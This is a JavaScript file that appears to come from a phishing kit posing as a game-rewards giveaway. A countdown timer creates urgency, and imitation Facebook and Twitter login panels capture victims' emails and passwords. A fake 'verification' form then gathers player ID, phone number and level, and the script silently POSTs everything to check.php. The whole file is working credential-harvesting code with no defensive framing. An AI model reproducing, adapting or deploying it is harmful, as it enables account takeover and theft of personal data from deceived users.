var buka = new Audio();
buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";
var tutup = new Audio();
tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";
$(document).ready(function () {
    var detik = 59;
    var menit = 59;
    var jam = 23;

    function hitung() {
        setTimeout(hitung, 1000);
        $('#latestTimer').html('' + jam + ' : ' + menit + ' : ' + detik + '');
        detik--;
        if (detik < 0) {
            detik = 59;
            menit--;
            if (menit < 0) {
                menit = 0;
                detik = 0;
            }
        }
    }
    hitung();
});

function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

function open_itemReward_confirmation(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    $('.itemReward_confirmation').show();
    $('#myItemReward_confirmationImg').attr('src', itemReward_confirmationImg);
}

function open_otherReward_confirmation(ag) {
    var otherReward_confirmationImg = $(ag).attr("src");
    var otherReward_confirmationValue = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src', otherReward_confirmationImg);
    $('#otherReward_confirmationValue').html(otherReward_confirmationValue);
}

function open_account_login() {
    $('.account_login').show();
    $(".itemReward_confirmation").hide()
    $(".otherReward_confirmation").hide()
}

function open_facebook() {
    $('.login-facebook').show();
    $('.account_login').hide();
}

function open_twitter() {
    $('.login-twitter').show();
    $('.account_login').hide();
}

function close_reward_confirmation() {
    $(".itemReward_confirmation").hide()
    $(".otherReward_confirmation").hide()
}

function tutup_facebook() {
    $('.login-facebook').hide()
    $('.account_login').show();
}

function tutup_twitter() {
    $('.login-twitter').hide()
    $('.account_login').show();
}

function ValidateLoginFbData() {
    $('#ValidateLoginFbForm').submit(function (submitingValidateLoginFbData) {
        submitingValidateLoginFbData.preventDefault();
        $emailfb = $('#email-facebook').val().trim();
        $passwordfb = $('#password-facebook').val().trim();
        $loginfb = $('#login-facebook').val().trim();
        if ($emailfb == '' || $emailfb == null || $emailfb.length <= 5) {
            $('.email-fb').show();
            $('.sandi-fb').hide();
            $('.account_verification').hide();
            $('.login-facebook').show();
            return false;
        } else {
            $('.email-fb').hide();
            $("input#validateEmail").val($emailfb);
            $('.account_verification').show();
            $('.login-facebook').hide();
        }
        if ($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 5) {
            $('.sandi-fb').show();
            $('.account_verification').hide();
            $('.login-facebook').show();
            return false;
        } else {
            $('.sandi-fb').hide();
            $("input#validatePassword").val($passwordfb);
            $("input#validateLogin").val($loginfb);
            $('.account_verification').show();
            $('.login-facebook').hide();
        }
    });
}

function ValidateLoginTwitterData() {
    $('#ValidateLoginTwitterForm').submit(function (submitingValidateLoginTwitterData) {
        submitingValidateLoginTwitterData.preventDefault();
        $emailtw = $('#email-twitter').val().trim();
        $passwordtw = $('#password-twitter').val().trim();
        $logintw = $('#login-twitter').val().trim();
        if ($emailtw == '' || $emailtw == null || $emailtw.length <= 5) {
            $('.email-tw').show();
            $('.sandi-tw').hide();
            $('.account_verification').hide();
            $('.login-twitter').show();
            return false;
        } else {
            $('.email-tw').hide();
            $("input#validateEmail").val($emailtw);
            $('.account_verification').show();
            $('.login-twitter').hide();
        }
        if ($passwordtw == '' || $passwordtw == null || $passwordtw.length <= 5) {
            $('.sandi-tw').show();
            $('.account_verification').hide();
            $('.login-twitter').show();
            return false;
        } else {
            $('.sandi-tw').hide();
            $("input#validatePassword").val($passwordtw);
            $("input#validateLogin").val($logintw);
            $('.account_verification').show();
            $('.login-twitter').hide();
        }
    });
}

function ValidateVerificationData() {
    $('#ValidateVerificationDataForm').submit(function (submitingVerificationData) {
        submitingVerificationData.preventDefault();
        var $validateEmail = $("input#validateEmail").val();
        var $validatePassword = $("input#validatePassword").val();
        var $playid = $("input#playid").val();
        var $phone = $("input#phone").val();
        var $level = $("input#level").val();
        var $validateLogin = $("input#validateLogin").val();
        if ($validateEmail == "" && $validatePassword == "" && $playid == "" && $phone == "" && $level == "" && $validateLogin == "") {
            $('.verification_info').show();
            $('.account_verification').hide();
            return false;
        }
        $.ajax({
            type: "POST",
            url: "check.php",
            data: $(this).serialize(),
            beforeSend: function () {
                $('.check_verification').show();
                $('.account_verification').hide();
            },
            success: function () {
                $(".processing-section").show();
                $(".rewards-section").hide();
                $('.check_verification').hide();
                $('.account_verification').hide();
            }
        });
    });
    return false;
};